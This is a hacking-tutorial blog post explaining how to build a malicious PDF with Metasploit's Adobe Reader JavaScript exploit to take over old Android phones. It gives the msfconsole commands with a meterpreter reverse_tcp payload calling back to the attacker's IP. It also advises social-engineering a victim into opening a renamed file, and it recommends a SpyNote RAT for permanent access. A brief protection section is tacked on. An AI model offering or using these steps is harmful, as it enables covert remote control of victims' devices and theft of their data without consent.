---
title: 'Hacking android with pdf file (adobe reader and javascript exploit)
www.hackshala.in'
date: 2019-12-16T20:36:00+01:00
draft: false
---

[www.hackshala.in](http://www.hackshala.in/)
--------------------------------------------

### **Step 1:** **Start Kali Linux.**

Start your Kali Linux machine and open Metasploit console to start hacking android with a pdf file.  
![](https://myhackingworld.com/wp-content/uploads/2019/06/m4.jpg)  

### **Step 2:** **Make the malicious pdf file with the adobe reader** **exploit**

To make a malicious pdf file type the following commands in msf console:  
**use exploit/android/fileformat/adobe\_reader\_pdf\_js\_interface  
**  
**set payload android/meterpreter/reverse\_tcp**  
**set lhost 192.168.182.136 (your IP here)**  
**set port 20068**  
**exploit**  
![](https://myhackingworld.com/wp-content/uploads/2019/09/Kali-Linux-2019.2-vmware-amd64-2019-09-07-17-54-21-min-1024x576.jpg)  
  

### **Step 3: Hack the android device with pdf file**

Now that the malicious pdf is ready. Use social engineering to send malicious pdf to the victim. You can use any pdf editor to edit the file and add some content to make the file look more realistic.  
The folder path is: **/root/.msf4/local/msf.pdf**  
In my case, the pdf is msf.pdf, but you can always change the name to something which the victim will click on.  
![](https://myhackingworld.com/wp-content/uploads/2019/09/Kali-Linux-2019.2-vmware-amd64-2019-09-07-17-58-28-min-1024x517.jpg)  
Note: This attack works only on limited android devices with vulnerable webview API and old adobe reader versions.  

### **Step 4: Enjoy the hack.**

Once the victim opens the malicious pdf file, the android phone will be hacked, and we will get shell access on out kali machine, and you can control it remotely with meterpreter shell. This is how easy it is to hack an android device with a pdf file  
Frankly, my best solution for hacking android phones is [**hacking with spynote**](https://myhackingworld.com/how-hackers-hack-android-phones-with-spynote-rat-tool/). Because it has no limitations and you can have permanent access. But if you want to hack any android device with a pdf, this is the way to do it.  

### **How do I protect myself from hackers using this hack?**

— UPDATE YOUR DEVICE: This bug has been long fixed by adobe and android. Make sure you update your android device and all the apps you use.

— CHANGE YOUR ANDROID DEVICE: Buy a new android device with the latest updates. Android one devices are best when it comes to security.

— OFFICIAL PLAYSTORE: Only install apps from the official play store. Do not open unknown links and files which you do not trust.

— INSTALL AN ANTIVIRUS: Install a good antivirus on your android phone. I have already written an article about [**Top 10 antivirus for android.**](https://myhackingworld.com/antivirus-apps-for-android/) Do read it.

  

### **Commonly asked questions about hacking android with pdf files:**

**Q1) Does it work on all android phones?**  
No, only with android phones having a vulnerable version of adobe reader installed and android version lollipop and below.  
**Q2) It’s not working on my kali machine?**  
Update Kali Linux and try again. Use **sudo apt-get dist-upgrade** command. Try repeating all the steps mentioned in the article. If you get any specific error, then mention it in the comment section.  
**Q3) How do I make this hack permanent?**  
Use the same method as I described in [**spynote article**](https://myhackingworld.com/how-hackers-hack-android-phones-with-spynote-rat-tool/) with NOIP. I will be writing a separate article on making hackers permanent to stay tuned and share the articles as much as you can.